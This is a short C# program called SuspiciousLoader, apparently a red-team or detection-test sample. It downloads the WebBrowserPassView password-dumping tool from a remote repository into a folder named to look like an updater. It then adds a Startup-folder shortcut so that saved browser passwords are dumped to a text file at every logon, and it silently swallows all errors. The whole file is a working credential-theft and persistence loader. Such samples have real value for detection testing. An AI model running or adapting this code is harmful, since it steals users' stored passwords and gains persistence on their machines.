// Program.cs
using System;
using System.IO;
using System.Net;
using System.Reflection;

namespace SuspiciousLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // 1) Marker in Downloads
                string downloads = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    "Downloads"
                );
                string marker = Path.Combine(downloads, "marker.txt");
                File.AppendAllText(marker,
                    $"[SuspiciousLoader] ran at {DateTime.UtcNow:O}{Environment.NewLine}"
                );

                // 2) Create staging folder under AppData
                string appData   = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string updater   = Path.Combine(appData, "Updater");
                Directory.CreateDirectory(updater);

                // 3) Download WebBrowserPassView.exe into Updater
                string wbpvUrl = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe";
                string wbpvExe = Path.Combine(updater, "WebBrowserPassView.exe");
                using (var wc = new WebClient())
                {
                    wc.DownloadFile(wbpvUrl, wbpvExe);
                }

                // 4) Create a Startup‐folder shortcut pointing at WebBrowserPassView.exe
                string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string link    = Path.Combine(startup, "Updater.lnk");

                // Use COM to build the .lnk
                Type t = Type.GetTypeFromProgID("WScript.Shell");
                dynamic shell = Activator.CreateInstance(t);
                dynamic shortcut = shell.CreateShortcut(link);

                // Set properties: run wbpv.exe /stext "…\data.txt"
                string dataTxt = Path.Combine(updater, "data.txt");
                shortcut.TargetPath = wbpvExe;
                shortcut.Arguments  = $"/stext \"{dataTxt}\"";
                shortcut.WorkingDirectory = updater;
                shortcut.Save();
            }
            catch
            {
                // Swallow all errors
            }
        }
    }
}
